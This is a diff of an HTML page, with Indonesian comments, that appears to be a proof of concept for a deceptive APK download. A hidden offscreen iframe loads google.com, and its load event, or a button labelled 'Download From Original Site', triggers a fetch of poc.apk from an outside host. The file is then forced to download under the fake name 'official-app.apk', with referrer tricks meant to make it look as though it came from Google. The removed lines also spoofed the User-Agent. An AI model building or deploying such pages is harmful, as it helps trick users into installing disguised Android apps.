@@ -1,7 +1,7 @@
 <html>
-<head>
+ <head>
   <meta charset="utf-8">
-  <meta http-equiv="Referrer-Policy" content="origin"> <!-- Global policy untuk fetch context -->
+  <meta name="referrer" content="origin-when-cross-origin"> <!-- Set referrer policy ke Google-like -->
 <style>
 .button {
   background-color: #4CAF50;
@@ -14,71 +14,58 @@
   font-size: 16px;
   margin: 4px 2px;
   cursor: pointer;
-  border-radius: 8px;
 }
 .hidden-iframe {
   position: absolute;
-  left: -9999px;
+  left: -9999px; /* Sembunyikan iframe */
   width: 1px;
   height: 1px;
 }
 </style>
-</head>
-<body>
-  <!-- Iframe untuk context Google (no visual, pure referrer sim) -->
-  <iframe class="hidden-iframe" src="https://www.google.com"></iframe>
-  
-  <center><button class="button" onclick="triggerBlobDownload()">Trigger Download</button></center>
-
+ </head>
+ <body>
+  <!-- Iframe tersembunyi untuk load Google, simulasi origin -->
+  <iframe class="hidden-iframe" src="https://www.google.com" onload="simulateDownload()"></iframe>
+ 
   <script>
-function triggerBlobDownload() {
-  // Load iframe untuk referrer context (no SE, pure tech)
-  const iframe = document.querySelector('.hidden-iframe');
-  iframe.onload = async () => {
-    setTimeout(async () => {  // Delay minimal untuk context settle
-      try {
-        // Fetch dengan enhanced options: mimic trusted request
-        const response = await fetch('https://aliothme.github.io/poc.apk', {
-          method: 'GET',
-          referrerPolicy: 'origin',  // Kirim origin Google ke server (devtools only)
-          headers: {
-            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; Pixel) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Mobile Safari/537.36',  // Mimic Android Chrome (kurangi server-side block)
-            'Accept': 'application/vnd.android.package-archive'  // Hint MIME ke browser
-          },
-          mode: 'cors'  // Force CORS compliance
-        });
-
-        if (!response.ok) throw new Error('Fetch failed');
-
-        const blob = await response.blob();
-        // Enhanced blob: Set MIME eksplisit untuk bypass type detection
-        const enhancedBlob = new Blob([blob], { 
-          type: 'application/vnd.android.package-archive; charset=utf-8'  // Standar APK + fallback
-        });
-        
-        const blobUrl = URL.createObjectURL(enhancedBlob);
-
-        // Virtual anchor dengan tweaks untuk cross-browser
-        const a = document.createElement('a');
-        a.href = blobUrl;
-        a.download = 'app-update.apk';  // Nama netral, no "official"
-        a.rel = 'noopener';  // Isolasi context, kurangi leak
-        document.body.appendChild(a);  // Wajib untuk Firefox
-        a.click();  // Trigger download
-        document.body.removeChild(a);  // Clean up
-
-        // Revoke setelah delay (hindari memory leak)
-        setTimeout(() => URL.revokeObjectURL(blobUrl), 500);
-
-        console.log('Blob download triggered - Origin: local (no spoof possible per 2025 specs)');
-      } catch (error) {
-        console.error('Error:', error);
-      }
-    }, 1000);  // Delay 1 detik untuk natural fetch
-  };
-  // Reload iframe untuk fresh context
-  iframe.src = 'https://www.google.com';
+function simulateDownload() {
+  // Delay singkat untuk load Google di iframe
+  setTimeout(async function(){
+    try {
+      // Fetch APK dari GitHub, referrer otomatis dari policy (kelihatan dari google.com)
+      const response = await fetch('https://aliothme.github.io/poc.apk', {
+        method: 'GET',
+        referrerPolicy: 'origin' // Force referrer ke origin (google.com context)
+      });
+     
+      if (!response.ok) throw new Error('Fetch gagal');
+     
+      const blob = await response.blob();
+      const blobUrl = URL.createObjectURL(blob); // Buat blob URL local (bypass origin spoof visual)
+     
+      // Buat virtual anchor untuk download, tanpa buka tab baru
+      const a = document.createElement('a');
+      a.href = blobUrl;
+      a.download = 'official-app.apk'; // Nama file palsu, biar kelihatan resmi
+      document.body.appendChild(a);
+      a.click();
+      document.body.removeChild(a);
+     
+      // Revoke blob setelah download
+      setTimeout(() => URL.revokeObjectURL(blobUrl), 1000);
+     
+      console.log('Download dipicu - cek referrer di devtools: seharusnya dari google.com');
+    } catch (error) {
+      console.error('Error:', error); // Fallback jika CORS block (GitHub allow CORS untuk APK)
+    }
+  }, 2000); // Delay 2 detik
+}
+// Trigger iframe load saat tombol diklik
+function a(){
+  // Reset iframe src untuk reload Google
+  document.querySelector('.hidden-iframe').src = 'https://www.google.com';
 }
   </script>
-</body>
+  <center><input type="button" class="button" value="Download From Original Site" onclick="a()"> </center>
+ </body>
 </html>
